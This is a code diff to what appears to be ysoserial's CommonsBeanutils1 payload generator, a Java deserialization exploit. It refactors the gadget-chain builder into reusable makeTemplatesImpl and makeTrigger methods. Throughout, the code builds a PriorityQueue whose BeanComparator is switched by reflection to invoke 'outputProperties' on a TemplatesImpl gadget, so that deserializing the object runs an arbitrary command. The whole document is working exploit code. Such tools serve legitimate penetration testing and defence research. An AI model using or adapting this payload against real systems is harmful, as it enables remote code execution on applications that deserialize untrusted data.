@@ -17,7 +17,15 @@ import ysoserial.payloads.util.Reflections;
 public class CommonsBeanutils1 implements ObjectPayload<Object> {
 
 	public Object getObject(final String command) throws Exception {
-		final Object templates = Gadgets.createTemplatesImpl(command);
+		return makeTemplatesImpl(command);
+	}
+
+	static public Object makeTemplatesImpl(final String command) throws Exception {
+		final Object gadget = Gadgets.createTemplatesImpl(command);
+		return makeTrigger(gadget, "outputProperties");
+	}
+
+        static public Object makeTrigger(final Object gadget, final String triggerField) throws Exception {
 		// mock method name until armed
 		final BeanComparator comparator = new BeanComparator("lowestSetBit");
 
@@ -28,15 +36,16 @@ public class CommonsBeanutils1 implements ObjectPayload<Object> {
 		queue.add(new BigInteger("1"));
 
 		// switch method called by comparator
-		Reflections.setFieldValue(comparator, "property", "outputProperties");
+		Reflections.setFieldValue(comparator, "property", triggerField);
 
 		// switch contents of queue
 		final Object[] queueArray = (Object[]) Reflections.getFieldValue(queue, "queue");
-		queueArray[0] = templates;
-		queueArray[1] = templates;
+		queueArray[0] = gadget;
+		queueArray[1] = gadget;
 
 		return queue;
 	}
+
 
 	public static void main(final String[] args) throws Exception {
 		PayloadRunner.run(CommonsBeanutils1.class, args);
